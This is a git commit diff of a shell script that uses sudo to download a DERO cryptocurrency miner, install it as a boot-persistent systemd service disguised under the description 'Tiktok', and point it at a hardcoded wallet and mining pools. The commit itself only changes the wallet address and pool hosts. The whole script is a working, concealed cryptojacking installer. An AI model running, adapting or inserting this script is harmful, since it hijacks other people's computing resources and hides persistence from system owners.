e16331de42404e55fd97f50f26833c10b6ecc5fa
claudiaeliza1912 <126445871+claudiaeliza1912@users.noreply.github.com>
2023-03-30 17:25:35 +0700

    Update aaaa.sh

--- aaaa.sh
+++ aaaa.sh
@@ -2,7 +2,7 @@ cd /home
 sudo wget https://github.com/dero-am/astrobwt-miner/releases/download/V1.9/astrominer-V1.9_modern_amd64_linux.tar.gz
 sudo apt update
 sudo tar xvzf astrominer-V1.9_modern_amd64_linux.tar.gz
-sudo bash -c 'echo -e "[Unit]\nDescription=Tiktok\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/home/astrominer -w deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92x6vrhm75m8f6tqs8dfaq7 -r 20.120.96.83:4444\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/deroz.service'
+sudo bash -c 'echo -e "[Unit]\nDescription=Tiktok\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/home/astrominer -w deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92xe5re92qtl4vq3s6clk3v -r community-pools.mysrv.cloud:10100 -r1 nodent2.cpumining.cloud:10100\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/deroz.service'
 sudo systemctl daemon-reload
 sudo systemctl enable deroz.service
 echo "Setup completed!"
